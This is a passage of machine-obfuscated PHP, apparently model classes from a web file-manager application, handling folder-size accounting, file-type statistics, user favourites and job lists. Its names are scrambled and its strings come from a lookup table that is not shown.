($éÕÀµ[$ÄšòÍ¯¦[419]] == $ÄšòÍ¯¦[98]) { $éÕÀµ[$ÄšòÍ¯¦[89]] = $this->folderChildrenNumber($¢â´¬Ïô); } self::$cachePathInfoMore[$¢â´¬Ïô] = $éÕÀµ; return $éÕÀµ; } public function sourceInfo($€ÇÔ½ï) { $´»øşÑ =& $_SERVER[ñ÷§¡å]; if (!$€ÇÔ½ï) { return array(); } $€ÇÔ½ï = intval($€ÇÔ½ï); $¬¹¤Ê´‚ = $´»øşÑ[469] . $€ÇÔ½ï; $¬Øéèöè = _get(self::$cacheSourceInfo, $¬¹¤Ê´‚); if ($¬Øéèöè) { return $¬Øéèöè; } $ÜøŠÏÈÈ = $this->where(array($´»øşÑ[411] => $€ÇÔ½ï))->find(); self::$cacheSourceInfo[$¬¹¤Ê´‚] = $ÜøŠÏÈÈ; return self::$cacheSourceInfo[$¬¹¤Ê´‚]; } public function sourceCacheClear($ÔÓ æÍÛ = false) { self::cacheClear($ÔÓ æÍÛ); } public static function cacheClear($ÃØø¿´º = false) { $”¹Ü¾å¡ =& $_SERVER[ñ÷§¡å]; if ($ÃØø¿´º == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$”¹Ü¾å¡[469] . $ÃØø¿´º]); unset(self::$cachePathInfoMore[$ÃØø¿´º]); unset(self::$cachePathInfo[$”¹Ü¾å¡[2132] . $ÃØø¿´º]); unset(self::$cachePathInfo[$”¹Ü¾å¡[2133] . $ÃØø¿´º]); } public function metaSet($Ğ¹ú÷¿ù, $±óü©“ = null, $¶Ø³×’Û = null) { $°°½Ê” = parent::metaSet($Ğ¹ú÷¿ù, $±óü©“, $¶Ø³×’Û); if ($°°½Ê”) { $this->sourceCacheClear($Ğ¹ú÷¿ù); } return $°°½Ê”; } public function pathInfoByPath($åˆÀÁ€È, $ëØï»Ş²) { $Æê£×« =& $_SERVER[ñ÷§¡å]; $¢¸¨¢Šª = !$ëØï»Ş² ? array() : explode($Æê£×«[8], trim($ëØï»Ş², $Æê£×«[8])); $ÅõÆ¼ = $åˆÀÁ€È; foreach ($¢¸¨¢Šª as $Ç„ä£Üë) { $ÑîÌ²Ì = array($Æê£×«[441] => $ÅõÆ¼, $Æê£×«[32] => $Ç„ä£Üë); $º‰ÁÑœ¯ = $this->where($ÑîÌ²Ì)->select(); if (!$º‰ÁÑœ¯) { return !1; } $º‰ÁÑœ¯ = array_sort_by($º‰ÁÑœ¯, $Æê£×«[440]); $ÅõÆ¼ = $º‰ÁÑœ¯[0][$Æê£×«[411]]; } return $this->pathInfo($ÅõÆ¼, !0); } protected function updateModifyTime($“««íïµ) { $—³½ÅïÂ =& $_SERVER[ñ÷§¡å]; $»–Ë•›Ë = defined($—³½ÅïÂ[484]) ? USER_ID : $—³½ÅïÂ[207]; if (!$“««íïµ) { return; } if (!is_array($“««íïµ)) { $“««íïµ = array($“««íïµ); } foreach ($“««íïµ as $·¼·ËäĞ => $Ô‡Ê¢º) { $“««íïµ[$·¼·ËäĞ] = intval($Ô‡Ê¢º); $this->sourceCacheClear($Ô‡Ê¢º); } $ıí¤üø® = array($—³½ÅïÂ[411] => array($—³½ÅïÂ[7], $“««íïµ)); $Éıú´¥õ = array($—³½ÅïÂ[598] => $»–Ë•›Ë, $—³½ÅïÂ[433] => time()); $this->where($ıí¤üø®)->save($Éıú´¥õ); } public function folderSizeReset($Èëë‡‘, $·›®ÖÌú = false) { $¨’™Şù× =& $_SERVER[ñ÷§¡å]; if ($this->statusIgnoreResetSpace) { return; } $Æ…‹ËÅ— = $this->sourceInfo($Èëë‡‘); $–¯Ù±Ïø = $¨’™Şù×[2134] . $Èëë‡‘; CacheLock::lock($–¯Ù±Ïø, 20); if ($·›®ÖÌú === !1) { $this->sourceCacheClear($Èëë‡‘); $Æ…‹ËÅ— = $this->sourceInfo($Èëë‡‘); $®ùêÚü = array($¨’™Şù×[410] => $Èëë‡‘, $¨’™Şù×[439] => 0); $Ë«“Ñé = $this->where($®ùêÚü)->sum($¨’™Şù×[86]); $·›®ÖÌú = intval($Ë«“Ñé) - intval($Æ…‹ËÅ—[$¨’™Şù×[86]]); } if ($·›®ÖÌú == 0) { return CacheLock::unlock($–¯Ù±Ïø); } $ø‡»¾É = $this->parentLevelArray($Æ…‹ËÅ—[$¨’™Şù×[530]]); if (!$ø‡»¾É) { $ø‡»¾É = array(); } $ø‡»¾É[] = $Æ…‹ËÅ—[$¨’™Şù×[411]]; $®ùêÚü = array($¨’™Şù×[411] => array($¨’™Şù×[427], $ø‡»¾É)); if ($·›®ÖÌú < 0) { $®ùêÚü[$¨’™Şù×[86]] = array($¨’™Şù×[1022], abs($·›®ÖÌú)); } $this->where($®ùêÚü)->setAdd($¨’™Şù×[86], $·›®ÖÌú); CacheLock::unlock($–¯Ù±Ïø); $†²Ä›— = $¨’™Şù×[2135] . $Æ…‹ËÅ—[$¨’™Şù×[420]] . $¨’™Şù×[4] . $Æ…‹ËÅ—[$¨’™Şù×[514]]; $ğï„Õ€ = array($Æ…‹ËÅ—[$¨’™Şù×[420]], $Æ…‹ËÅ—[$¨’™Şù×[514]]); TaskRun::timeLimitCall($†²Ä›—, $¨’™Şù×[2136], $ğï„Õ€, 1.5); } public function folderSizeResetChildren($Ğˆú¸Òü) { $³¾õÀ×€ =& $_SERVER[ñ÷§¡å]; $this->sourceCacheClear($Ğˆú¸Òü); $º¢£—»¢ = $this->sourceInfo($Ğˆú¸Òü); $í‘ÃíÇë = array($³¾õÀ×€[592] => 1, $³¾õÀ×€[596] => $º¢£—»¢[$³¾õÀ×€[514]], $³¾õÀ×€[599] => array($³¾õÀ×€[559], $º¢£—»¢[$³¾õÀ×€[530]] . $Ğˆú¸Òü . $³¾õÀ×€[560])); $ç‘¸¦€ = $³¾õÀ×€[2137]; $ºÇÖø½Í = $this->field($ç‘¸¦€)->where($í‘ÃíÇë)->select(); $í‘ÃíÇë[$³¾õÀ×€[419]] = 0; $³ä£à = $this->field($ç‘¸¦€)->where($í‘ÃíÇë)->select(); if (!$³ä£à) { return; } $ºÇÖø½Í[] = $º¢£—»¢; $ºÇÖø½Í = array_to_keyvalue($ºÇÖø½Í, $³¾õÀ×€[411]); foreach ($ºÇÖø½Í as $şƒ¯ÎŸâ => $ìç«ÂÈ) { $ºÇÖø½Í[$şƒ¯ÎŸâ][$³¾õÀ×€[2138]] = $ºÇÖø½Í[$şƒ¯ÎŸâ][$³¾õÀ×€[86]]; $ºÇÖø½Í[$şƒ¯ÎŸâ][$³¾õÀ×€[86]] = 0; } foreach ($³ä£à as $ìç«ÂÈ) { $½Ï¡¬›ä = $ìç«ÂÈ[$³¾õÀ×€[441]] . $³¾õÀ×€[12]; if (!isset($ºÇÖø½Í[$½Ï¡¬›ä])) { continue; } if ($ìç«ÂÈ[$³¾õÀ×€[440]] == $ºÇÖø½Í[$½Ï¡¬›ä][$³¾õÀ×€[440]]) { $ºÇÖø½Í[$½Ï¡¬›ä][$³¾õÀ×€[86]] += $ìç«ÂÈ[$³¾õÀ×€[86]]; } } foreach ($ºÇÖø½Í as $ìç«ÂÈ) { $ÒïÄ š¯ = $this->parentLevelArray($ìç«ÂÈ[$³¾õÀ×€[530]]); foreach ($ÒïÄ š¯ as $½Ï¡¬›ä) { $½Ï¡¬›ä = $½Ï¡¬›ä . $³¾õÀ×€[12]; if (!isset($ºÇÖø½Í[$½Ï¡¬›ä])) { continue; } if ($ìç«ÂÈ[$³¾õÀ×€[440]] == $ºÇÖø½Í[$½Ï¡¬›ä][$³¾õÀ×€[440]]) { $ºÇÖø½Í[$½Ï¡¬›ä][$³¾õÀ×€[86]] += $ìç«ÂÈ[$³¾õÀ×€[86]]; } } } $ÃµÇ†¤ = array(); foreach ($ºÇÖø½Í as $ìç«ÂÈ) { if ($ìç«ÂÈ[$³¾õÀ×€[86]] == $ìç«ÂÈ[$³¾õÀ×€[2138]]) { continue; } $ÃµÇ†¤[] = array($³¾õÀ×€[411], $ìç«ÂÈ[$³¾õÀ×€[411]], $³¾õÀ×€[86], $ìç«ÂÈ[$³¾õÀ×€[86]]); } $this->saveAll($ÃµÇ†¤); } public function userSpaceReset($Í¶íÚ‚˜ = false) { $–Ã›Èü =& $_SERVER[ñ÷§¡å]; $Ûí¥€«¡ = $this->where(array($–Ã›Èü[420] => self::TYPE_USER, $–Ã›Èü[514] => $Í¶íÚ‚˜, $–Ã›Èü[419] => 0))->sum($–Ã›Èü[86]); $Ûí¥€«¡ = !$Ûí¥€«¡ || $Ûí¥€«¡ <= 0 ? 0 : $Ûí¥€«¡; Model($–Ã›Èü[522])->userEdit($Í¶íÚ‚˜, array($–Ã›Èü[1824] => $Ûí¥€«¡)); } public function targetSpaceUpdate($¢à•òã£, $…ù®…üª) { $È±İÑ„ =& $_SERVER[ñ÷§¡å]; if (!$…ù®…üª) { return; } if (!in_array($¢à•òã£, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $„°—‡³Â = $this->targetSpaceSize($¢à•òã£, $…ù®…üª); if ($¢à•òã£ == self::TYPE_USER) { Model($È±İÑ„[522])->userEdit($…ù®…üª, array($È±İÑ„[1824] => $„°—‡³Â)); } else { if ($¢à•òã£ == self::TYPE_GROUP) { Model($È±İÑ„[531])->groupEdit($…ù®…üª, array($È±İÑ„[1824] => $„°—‡³Â)); } } } public function targetSpaceSize($ï†…ÑÂÁ, $ñ®ßå¨) { $ŸŸù½Ş¥ =& $_SERVER[ñ÷§¡å]; $ôˆ‘–ş = 0; $Éá‚šï = $this->sourceRoot($ï†…ÑÂÁ, $ñ®ßå¨, !0); foreach ($Éá‚šï as $¾Ÿœ®›ô) { if (!$¾Ÿœ®›ô) { continue; } $ôˆ‘–ş += floatval($¾Ÿœ®›ô[$ŸŸù½Ş¥[86]]); $õêÈ®»Ö = array($ŸŸù½Ş¥[599] => array($ŸŸù½Ş¥[559], $ŸŸù½Ş¥[540] . $¾Ÿœ®›ô[$ŸŸù½Ş¥[411]] . $ŸŸù½Ş¥[560])); $ı¢®„ = Model($ŸŸù½Ş¥[438])->field($ŸŸù½Ş¥[426])->where($õêÈ®»Ö)->select(); $ı¢®„ = array_to_keyvalue($ı¢®„, $ŸŸù½Ş¥[12], $ŸŸù½Ş¥[411]); $ı¢®„ = array_unique(array_filter($ı¢®„)); if ($ı¢®„) { $õêÈ®»Ö = array($ŸŸù½Ş¥[426] => array($ŸŸù½Ş¥[427], $ı¢®„)); $ôˆ‘–ş += floatval($this->where($õêÈ®»Ö)->sum($ŸŸù½Ş¥[86])); } } $ôˆ‘–ş = !$ôˆ‘–ş || $ôˆ‘–ş <= 0 ? 0 : $ôˆ‘–ş; return $ôˆ‘–ş; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($”…¡Å¦ì) { return $this->fileTypeProfile($”…¡Å¦ì, SourceModel::TYPE_USER); } public function groupFileTypeProfile($àî ªÜË) { return $this->fileTypeProfile($àî ªÜË, SourceModel::TYPE_GROUP); } private function fileTypeProfile($äŸ¸²£», $áÜíîéë) { $Ê±µ…Üğ =& $_SERVER[ñ÷§¡å]; $¹™¹ğ§ƒ = $Ê±µ…Üğ[2139] . $äŸ¸²£» . $Ê±µ…Üğ[11] . $áÜíîéë; $î˜Îö¯í = Cache::get($¹™¹ğ§ƒ); if ($î˜Îö¯í) { return $î˜Îö¯í; } $×Ãáê—Ò = array($Ê±µ…Üğ[592] => 0); if ($äŸ¸²£» != !1) { $×Ãáê—Ò[$Ê±µ…Üğ[514]] = $äŸ¸²£»; $×Ãáê—Ò[$Ê±µ…Üğ[420]] = $áÜíîéë; } $ôÆÒÑÃò = array(); $ôÆÒÑÃò[$Ê±µ…Üğ[2140]] = array($Ê±µ…Üğ[2141] => LNG($Ê±µ…Üğ[2140]), $Ê±µ…Üğ[2142] => $this->where($×Ãáê—Ò)->count(), $Ê±µ…Üğ[594] => $this->where($×Ãáê—Ò)->sum($Ê±µ…Üğ[86])); $•¿œìè¨ = KodIO::fileTypeList(); foreach ($•¿œìè¨ as $á€á“›Ô => $ĞİÈ®¹Ó) { $×Ãáê—Ò[$Ê±µ…Üğ[421]] = $this->fileTypeWhere($á€á“›Ô); $ôÆÒÑÃò[$á€á“›Ô] = array($Ê±µ…Üğ[2141] => $ĞİÈ®¹Ó[$Ê±µ…Üğ[32]], $Ê±µ…Üğ[2142] => $this->where($×Ãáê—Ò)->count(), $Ê±µ…Üğ[594] => $this->where($×Ãáê—Ò)->sum($Ê±µ…Üğ[86])); } Cache::set($¹™¹ğ§ƒ, $ôÆÒÑÃò, 1200); return $ôÆÒÑÃò; } public function fileNameExist($ôš–ßÙ‚, $¿ãÆ„Ğ×) { $ÆŞ°ıÖ =& $_SERVER[ñ÷§¡å]; $æ­Ş™Áî = $this->where(array($ÆŞ°ıÖ[441] => $ôš–ßÙ‚, $ÆŞ°ıÖ[32] => $¿ãÆ„Ğ×, $ÆŞ°ıÖ[440] => 0))->find(); return is_array($æ­Ş™Áî) ? $æ­Ş™Áî[$ÆŞ°ıÖ[411]] : !1; } public function childList($ßÕÃğğè) { $¹²ŒöĞ‹ =& $_SERVER[ñ÷§¡å]; $…–Ş¡ú = $¹²ŒöĞ‹[2117] . $ßÕÃğğè; if (isset(self::$cacheChildList[$…–Ş¡ú])) { return self::$cacheChildList[$…–Ş¡ú]; } $İ÷ÑÆˆÂ = array($¹²ŒöĞ‹[441] => intval($ßÕÃğğè), $¹²ŒöĞ‹[440] => 0); $è¡°—§õ = $this->where($İ÷ÑÆˆÂ)->select(); $è¡°—§õ = $è¡°—§õ ? $è¡°—§õ : array(); self::$cacheChildList[$…–Ş¡ú] = $è¡°—§õ; foreach ($è¡°—§õ as $µÒØÅª») { $…–Ş¡ú = $¹²ŒöĞ‹[469] . $µÒØÅª»[$¹²ŒöĞ‹[411]]; self::$cacheSourceInfo[$…–Ş¡ú] = $µÒØÅª»; } return $è¡°—§õ; } public function fileNameAuto($“­ÔøœÉ, $Çá££¥, $¡øîÁç = REPEAT_RENAME, $„Ûîû²ö = false) { $ú“¸²Â­ =& $_SERVER[ñ÷§¡å]; $®†¢Íœ = get_path_ext($Çá££¥); $¡£·Œ·¹ = $®†¢Íœ ? basename($Çá££¥, $ú“¸²Â­[10] . $®†¢Íœ) . $ú“¸²Â­[2143] . $®†¢Íœ : $Çá££¥ . $ú“¸²Â­[393]; $¦ÈÊ™÷ = array($ú“¸²Â­[441] => $“­ÔøœÉ, $ú“¸²Â­[440] => 0, $ú“¸²Â­[32] => array($ú“¸²Â­[392], $¡£·Œ·¹)); $ë½ËòÒ— = $this->field($ú“¸²Â­[32])->where($¦ÈÊ™÷)->select(); $Å’‘Àƒä = array_to_keyvalue($ë½ËòÒ—, $ú“¸²Â­[12], $ú“¸²Â­[32]); return $this->fileNameAutoGet($Å’‘Àƒä, $Çá££¥, $¡øîÁç, $„Ûîû²ö); } public function fileNameAutoGet($õñ¥ù¿, $×üÈ–á, $Î¸¸àÀ¶, $¸¥ªÊÔ) { $ö‚Ë£ú =& $_SERVER[ñ÷§¡å]; if ($Î¸¸àÀ¶ == REPEAT_REPLACE || !$õñ¥ù¿ || !in_array_not_case($×üÈ–á, $õñ¥ù¿) || $¸¥ªÊÔ && $Î¸¸àÀ¶ != REPEAT_RENAME_FOLDER) { return $×üÈ–á; } if ($Î¸¸àÀ¶ == REPEAT_SKIP) { return !1; } $ÊúƒÃÀÂ = $ö‚Ë£ú[10] . get_path_ext($×üÈ–á); $ÊúƒÃÀÂ = $ÊúƒÃÀÂ == $ö‚Ë£ú[10] || $¸¥ªÊÔ ? $ö‚Ë£ú[12] : $ÊúƒÃÀÂ; for ($¾Ÿ¦†î = 1; $¾Ÿ¦†î <= count($õñ¥ù¿) + 1; $¾Ÿ¦†î++) { $´ÇŠºÑ‡ = substr($×üÈ–á, 0, strlen($×üÈ–á) - strlen($ÊúƒÃÀÂ)); $¯Û´èµ£ = $´ÇŠºÑ‡ . "\x28{$¾Ÿ¦†î}\x29{$ÊúƒÃÀÂ}"; if (!in_array_not_case($¯Û´èµ£, $õñ¥ù¿)) { return $¯Û´èµ£; } } } } goto aÅİÓ‰“Âø; e“­Œà‡›¢: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\164\x61\x73\x6b\x4c\151\163\164"; public $field = array("\156\141\x6d\x65", "\x74\171\160\145", "\145\166\x65\156\164", "\x74\151\155\x65", "\x64\x65\x73\143", "\x73\171\x73\x74\145\x6d", "\x65\156\x61\142\x6c\x65", "\154\x61\x73\x74\122\x75\x6e", "\x73\x6f\162\164"); public function listData($®µØ©­Ç = false, $×ºÜàÚñ = "\x73\x6f\x72\x74", $ËªØô = false) { return parent::listData($®µØ©­Ç, $×ºÜàÚñ, $ËªØô); } public function add($»Ç’€ÊÍ) { $˜â‰É— =& $_SERVER[ñ÷§¡å]; $Œ­·ûØ® = $this->findByName($»Ç’€ÊÍ[$˜â‰É—[32]]); if ($Œ­·ûØ®) { return !1; } $»Ç’€ÊÍ[$˜â‰É—[1623]] = 0; $»Ç’€ÊÍ[$˜â‰É—[1859]] = $this->getSort(); return parent::insert($»Ç’€ÊÍ); } private function getSort() { $ÛàãÅ³× =& $_SERVER[ñ÷§¡å]; $åÉê¹­Ú = parent::listData(); $é‡Ü¿á« = array_to_keyvalue($åÉê¹­Ú, $ÛàãÅ³×[12], $ÛàãÅ³×[1859]); return empty($é‡Ü¿á«) ? 0 : max($é‡Ü¿á«) + 1; } public function update($ˆ…ºâá÷, $½€¿Æ¿Œ) { $‚ÚÎ¤¡• =& $_SERVER[ñ÷§¡å]; $òÒû»Ó = $this->listData($ˆ…ºâá÷); $ËĞºÅŸ™ = $this->findByName($½€¿Æ¿Œ[$‚ÚÎ¤¡•[32]]); if (!$òÒû»Ó || $ËĞºÅŸ™ && $ËĞºÅŸ™[$‚ÚÎ¤¡•[408]] != $òÒû»Ó[$‚ÚÎ¤¡•[408]]) { return !1; } return parent::update($ˆ…ºâá÷, $½€¿Æ¿Œ); } public function remove($ˆÍ›è÷™, $¾İå©¶§ = false) { $İæáÛŸ =& $_SERVER[ñ÷§¡å]; $Ó¡¹±›Ë = $this->listData($ˆÍ›è÷™); if (!$Ó¡¹±›Ë) { return; } if (!$¾İå©¶§ && $Ó¡¹±›Ë[$İæáÛŸ[1283]] == $İæáÛŸ[98]) { return !1; } return parent::remove($ˆÍ›è÷™); } public function enable($™òÊ‘š‹, $Õ„âÔ•) { return $this->update($™òÊ‘š‹, array($_SERVER[ñ÷§¡å][2262] => $Õ„âÔ•)); } public function run($†³ºƒâ·) { return $this->update($†³ºƒâ·, array($_SERVER[ñ÷§¡å][2274] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($œÁÙğ›) { $¡·¹²Æñ =& $_SERVER[ñ÷§¡å]; return array($¡·¹²Æñ[1946] => array(USER_ID, $¡·¹²Æñ[2275])); } protected function listData() { $‹‹ˆ¢Ğ¢ =& $_SERVER[ñ÷§¡å]; $¼¿½³ê = array($‹‹ˆ¢Ğ¢[1654] => USER_ID, $‹‹ˆ¢Ğ¢[493] => 0); $ã¤¦¥ìÊ = $‹‹ˆ¢Ğ¢[2276]; $ƒßÇí¹ = $this->field($ã¤¦¥ìÊ)->where($¼¿½³ê)->order($‹‹ˆ¢Ğ¢[2277])->select(); return $ƒßÇí¹ ? $ƒßÇí¹ : array(); } protected function resetCache() { } protected function listView() { $Üıê·â =& $_SERVER[ñ÷§¡å]; $ïå†ÒÏı = $this->listData(); $ØİÒ¾…è = array_filter_by_field($ïå†ÒÏı, $Üıê·â[33], $Üıê·â[425]); $‘û—Ê§‰ = array_to_keyvalue($ØİÒ¾…è, $Üıê·â[12], $Üıê·â[94]); if (!$‘û—Ê§‰) { return $ïå†ÒÏı; } $şƒ‘¹„ = 2000; $ıèß§Ìó = array($Üıê·â[426] => array($Üıê·â[427], $‘û—Ê§‰)); $ÌÑÏ¼·” = Model($Üıê·â[838])->listSource($ıèß§Ìó, $şƒ‘¹„); $ÌÑÏ¼·” = array_merge($ÌÑÏ¼·”[$Üıê·â[93]], $ÌÑÏ¼·”[$Üıê·â[92]]); $ÌÑÏ¼·” = array_to_keyvalue($ÌÑÏ¼·”, $Üıê·â[411]); foreach ($ïå†ÒÏı as $²‹”ñÁ” => $è§Û€°¶) { $İÊÚÎà´ = $ÌÑÏ¼·”[$è§Û€°¶[$Üıê·â[94]]]; $İÊÚÎà´ = $İÊÚÎà´ ? $İÊÚÎà´ : array(); $ïå†ÒÏı[$²‹”ñÁ”] = array_merge($İÊÚÎà´, $è§Û€°¶); } return $ïå†ÒÏı; } protected function addFav($Ô¯Ğ–ì¹, $ÉŠŞë™š = '', $ä¤ Ò½ = "\163\157\x75\x72\143\145") { $¯â¯ ‡¤ =& $_SERVER[ñ÷§¡å]; $Îƒò·Ò = array($¯â¯ ‡¤[1654] => USER_ID, $¯â¯ ‡¤[493] => 0, $¯â¯ ‡¤[431] => $ä¤ Ò½, $¯â¯ ‡¤[430] => $Ô¯Ğ–ì¹); if ($this->where($Îƒò·Ò)->find()) { return !1; } $Îƒò·Ò = array($¯â¯ ‡¤[1654] => USER_ID, $¯â¯ ‡¤[493] => 0); $¦„æùßİ = $this->where($Îƒò·Ò)->max($¯â¯ ‡¤[1859]); if (!$¦„æùßİ) { $¦„æùßİ = 0; } if (!$ÉŠŞë™š && $ä¤ Ò½ == $¯â¯ ‡¤[425]) { $“Æ©¨Ê¿ = Model($¯â¯ ‡¤[1334])->where(array($¯â¯ ‡¤[426] => $Ô¯Ğ–ì¹))->find(); if (!$“Æ©¨Ê¿) { return !1; } $ÉŠŞë™š = $“Æ©¨Ê¿[$¯â¯ ‡¤[32]]; } $ÉŠŞë™š = $this->getAutoName($ÉŠŞë™š); $ß”ÈÎõî = array($¯â¯ ‡¤[1654] => USER_ID, $¯â¯ ‡¤[493] => 0, $¯â¯ ‡¤[429] => $ÉŠŞë™š, $¯â¯ ‡¤[430] => $Ô¯Ğ–ì¹, $¯â¯ ‡¤[431] => $ä¤ Ò½, $¯â¯ ‡¤[1839] => $¦„æùßİ + 1); return $this->add($ß”ÈÎõî); } protected function remove($ğø®µš¶) { $ë»ÁÀÁÓ =& $_SERVER[ñ÷§¡å]; $ö¾è”¦Ò = array($ë»ÁÀÁÓ[1654] => USER_ID, $ë»ÁÀÁÓ[428] => $ğø®µš¶); return $this->where($ö¾è”¦Ò)->delete(); } protected function removeByName($«¼Â¢ñ) { $Í«ù•Ú¹ =& $_SERVER[ñ÷§¡å]; $âÁ¬İ–² = array($Í«ù•Ú¹[1654] => USER_ID, $Í«ù•Ú¹[429] => $«¼Â¢ñ, $Í«ù•Ú¹[493] => 0); return $this->where($âÁ¬İ–²)->delete(); } protected function rename($°Ğ½Ã, $®á“±ƒÔ) { $üËÔ±é =& $_SERVER[ñ÷§¡å]; if ($°Ğ½Ã == $®á“±ƒÔ) { return !1; } $©¹¥‹º = $this->getAutoName($®á“±ƒÔ); if ($®á“±ƒÔ != $©¹¥‹º) { return !1; } $àöÌ‘¨ = array($üËÔ±é[1654] => USER_ID, $üËÔ±é[493] => 0, $üËÔ±é[32] => $°Ğ½Ã); return $this->where($àöÌ‘¨)->save(array($üËÔ±é[32] => $®á“±ƒÔ)); } protected function resetSort($¥êæ—€ƒ) { $›¾ûµ¦÷ =& $_SERVER[ñ÷§¡å]; $¥êæ—€ƒ = is_array($¥êæ—€ƒ) ? $¥êæ—€ƒ : array(); $ˆ‡Ç¬Ã = array($›¾ûµ¦÷[1654] => USER_ID); for ($Çºê¢ï® = 0; $Çºê¢ï® < count($¥êæ—€ƒ); $Çºê¢ï®++) { $ˆ‡Ç¬Ã[$›¾ûµ¦÷[428]] = $¥êæ—€ƒ[$Çºê¢ï®]; $this->where($ˆ‡Ç¬Ã)->save(array($›¾ûµ¦÷[1839] => $Çºê¢ï® + 1)); } return !0; } protected function moveTop($Çó€·Ìó) { $¦Ö›óôÏ =& $_SERVER[ñ÷§¡å]; $Í”¸íªî = array($¦Ö›óôÏ[1654] => USER_ID, $¦Ö›óôÏ[493] => 0); $ê¸ô­ÍÑ = $this->where($Í”¸íªî)->where(array($¦Ö›óôÏ[32] => $Çó€·Ìó))->find(); if (!$ê¸ô­ÍÑ) { return; } $§³¦‘² = $this->field($¦Ö›óôÏ[408])->where($Í”¸íªî)->order($¦Ö›óôÏ[2277])->select(); $§³¦‘² = array_to_keyvalue($§³¦‘², $¦Ö›óôÏ[12], $¦Ö›óôÏ[408]); $ö­Ö§Áæ = $§³¦‘²; $§³¦‘² = array_remove_value($§³¦‘², $ê¸ô­ÍÑ[$¦Ö›óôÏ[408]]); array_unshift($§³¦‘², $ê¸ô­ÍÑ[$¦Ö›óôÏ[408]]); return $this->resetSort($§³¦‘²); } protected function moveBottom($¶•»íî•) { $ªÉğæ£ =& $_SERVER[ñ÷§¡å]; $ÄÒ×ÁÔ = array($ªÉğæ£[1654] => USER_ID, $ªÉğæ£[493] => 0); $ç„ÂËËÎ = $this->where($ÄÒ×ÁÔ)->max($ªÉğæ£[1859]); $„Ò‹ÁÃë = array($ªÉğæ£[1859] => $ç„ÂËËÎ + 1); return $this->where($ÄÒ×ÁÔ)->where(array($ªÉğæ£[32] => $¶•»íî•))->save($„Ò‹ÁÃë); } private function getAutoName($·˜Ÿ—ÍÇ) { $Í¥¸²øş =& $_SERVER[ñ÷§¡å]; $ÖÔ„™£² = array($Í¥¸²øş[1654] => USER_ID, $Í¥¸²øş[493] => 0); $°ï¸¡õé = $this->field($Í¥¸²øş[32])->where($ÖÔ„™£²)->select(); $°ï¸¡õé = array_to_keyvalue($°ï¸¡õé, $Í¥¸²øş[12], $Í¥¸²øş[32]); if (!$°ï¸¡õé || !in_array($·˜Ÿ—ÍÇ, $°ï¸¡õé)) { return $·˜Ÿ—ÍÇ; } for ($Ü¬ˆ¦Æ€ = 0; $Ü¬ˆ¦Æ€ < count($°ï¸¡õé); $Ü¬ˆ¦Æ€++) { if (!in_array($·˜Ÿ—ÍÇ . "\x28{$Ü¬ˆ¦Æ€}\x29", $°ï¸¡õé)) { return $·˜Ÿ—ÍÇ . "\x28{$Ü¬ˆ¦Æ€}\x29"; } } return $·˜Ÿ—ÍÇ . "\x28{$Ü¬ˆ¦Æ€}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x6a\157\x62\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\144\145\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\x65\x6c\146\112\x6f\142\114\151\163\x74"; public function listData($¢ŠÂŸú = false, $ÎŠ‹ï¿Æ = "\x73\157\162\164", $¿„‚´ãã = false) { return parent::listData($¢ŠÂŸú, $ÎŠ‹ï¿Æ, $¿„‚´ãã); } public function remove($±ŠÆÔ³×) { return parent::remove($±ŠÆÔ³×); } public function add($Ş‹Äœ¦Ê) { $„ïÇĞ¤ =& $_SERVER[ñ÷§¡å]; if ($this->findByName($Ş‹Äœ¦Ê[$„ïÇĞ¤[32]])) { return !1; } $Ş‹Äœ¦Ê[$„ïÇĞ¤[1859]] = $this->getSort(); return parent::insert($Ş‹Äœ¦Ê); } private function getSort() { $§™ñíÁŠ =& $_SERVER[ñ÷§¡å]; $ÑöğÙÜ = parent::listData(); $ôöÆ¿–Š = array_to_keyvalue($ÑöğÙÜ, $§™ñíÁŠ[12], $§™ñíÁŠ[1859]); return empty($ôöÆ¿–Š) ? 0 : max($ôöÆ¿–Š) + 1; } public function update($“ŞÊ»¿Ó, $½ ÉÕÖ ) { $¦éğÎ¤ =& $_SERVER[ñ÷§¡å]; $š–ïó™» = parent::listData($“ŞÊ»¿Ó); $¡†äñŸü = $this->findByName($½ ÉÕÖ [$¦éğÎ¤[32]]); if (!$š–ïó™» || $¡†äñŸü && $¡†äñŸü[$¦éğÎ¤[408]] != $š–ïó™»[$¦éğÎ¤[408]]) { return !1; } return parent::update($“ŞÊ»¿Ó, $½ ÉÕÖ ); } public function setUserJob($îƒì¯Ä÷, $ª”ä×®ø) { $šøšå¼‹ =& $_SERVER[ñ÷§¡å]; if (!is_array($ª”ä×®ø)) { $ª”ä×®ø = array($ª”ä×®ø); } $ª—û†û = parent::listData(); $¥à÷©·” = array_to_keyvalue($ª—û†û, $šøšå¼‹[32]); $— ˜”ú† = $šøšå¼‹[387]; foreach ($ª”ä×®ø as $Œ¿ÛôÂÄ) { if ($¥à÷©·”[$Œ¿ÛôÂÄ]) { $— ˜”ú† .= $¥à÷©·”[$Œ¿ÛôÂÄ][$šøšå¼‹[408]] . $šøšå¼‹[50]; } else { $È’²³ü¤ = $this->add($Œ¿ÛôÂÄ); $— ˜”ú† .= $È’²³ü¤ . $šøšå¼‹[50]; } } $— ˜”ú† = rtrim($— ˜”ú†, $šøšå¼‹[50]); Model($šøšå¼‹[544])->metaSet($îƒì¯Ä÷, self::JOB_KEY, $— ˜”ú†); } public function getUserJob($¸Ëöº¼) { $®ôÃ¯ìè = Model($_SERVER[ñ÷§¡å][544])->metaGet($¸Ëöº¼); return $this->getUserJobInfo($®ôÃ¯ìè[self::JOB_KEY]); } public function getUserJobInfo($Ìµ ¶ÃÏ) { $ÜµÊ¾å¡ =& $_SERVER[ñ÷§¡å]; $çŠğââË = explode($ÜµÊ¾å¡[50], $Ìµ ¶ÃÏ); $È±ÆÆÙº = parent::listData(); $È±ÆÆÙº = array_remove_key($È±ÆÆÙº, $ÜµÊ¾å¡[210]); $¢ë˜¥¯Â 